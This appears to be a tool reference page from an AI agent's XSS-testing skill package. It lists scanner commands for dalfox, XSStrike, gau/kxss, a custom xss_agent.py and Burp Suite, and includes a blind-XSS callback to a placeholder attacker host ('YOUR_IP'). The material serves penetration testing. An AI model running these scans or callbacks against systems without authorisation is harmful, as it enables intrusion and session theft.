# XSS Tools Reference

## xss_agent.py (this skill's script)
```bash
pip3 install requests

# Reflected XSS on specific params
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --params "/search?q=FUZZ" "/profile?name=FUZZ"

# Cookie-based auth
python3 scripts/xss_agent.py https://target.com \
  --cookie "session=abc" \
  --params "/search?q=FUZZ"

# Stored XSS test
python3 scripts/xss_agent.py https://target.com \
  --token "eyJ..." \
  --submit-endpoint /api/comments \
  --display-endpoint /comments \
  --field body \
  -o report.json
```

## dalfox — Fast automated scanner
```bash
go install github.com/hahwul/dalfox/v2@latest

dalfox url "https://target.com/?q=test" -H "Cookie: session=abc"
dalfox url "https://target.com/?q=test" --blind "http://YOUR_IP:8888"
cat urls.txt | dalfox pipe -H "Cookie: session=abc"
```

## gau + kxss — URL discovery pipeline
```bash
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/Emoe/kxss@latest

gau target.com | grep "=" | kxss | dalfox pipe -H "Cookie: session=abc"
```

## XSStrike — Context-aware scanner
```bash
git clone https://github.com/s0md3v/XSStrike
pip3 install -r XSStrike/requirements.txt
python3 XSStrike/xsstrike.py -u "https://target.com/?q=test"
```

## Burp Suite
- **DOM Invader**: Enable in embedded browser → auto-detects sources→sinks
- **Intruder**: Mark injection point, load payloads.md list, grep for `alert(` in responses
- **Reflector extension** (BApp Store): highlights all reflected input in real-time

## CSP Evaluator
```bash
curl -sI https://target.com | grep -i content-security-policy
# Online: https://csp-evaluator.withgoogle.com
```
